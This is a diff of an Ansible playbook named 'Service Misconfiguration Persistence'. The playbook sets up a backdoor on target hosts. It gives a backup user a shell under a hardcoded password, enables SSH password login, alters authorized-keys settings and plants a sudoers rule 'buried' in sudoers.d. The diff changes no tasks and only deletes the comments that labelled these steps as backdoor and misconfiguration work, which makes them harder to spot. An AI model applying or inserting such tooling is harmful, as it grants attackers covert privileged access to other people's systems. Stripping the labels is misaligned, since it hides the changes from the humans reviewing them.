@@ -1,4 +1,3 @@
-# playbooks/service_misconfig.yml
 ---
 - name: Service Misconfiguration Persistence
   hosts: targets
@@ -10,8 +9,6 @@
     ssh_backdoor_pass: "backup123"
 
   tasks:
-
-    # --- MAKE BACKUP USER LOGIN-CAPABLE ---
 
     - name: Give backup user a shell
       user:
@@ -26,8 +23,6 @@
         owner: "{{ ssh_backdoor_user }}"
         group: "{{ ssh_backdoor_user }}"
         mode: '0750'
-
-    # --- SSH MISCONFIGURATION ---
 
     - name: Remove any existing AuthorizedKeysFile line
       lineinfile:
@@ -54,7 +49,7 @@
         regexp: '^#?PasswordAuthentication'
         line: 'PasswordAuthentication yes'
         state: present
-      ignore_errors: yes    # file may not exist on all machines
+      ignore_errors: yes
 
     - name: Harden other sshd_config options
       lineinfile:
@@ -71,8 +66,6 @@
       service:
         name: ssh
         state: restarted
-
-    # --- SUDOERS MISCONFIGURATION ---
 
     - name: Drop a sudoers rule buried in sudoers.d
       copy:
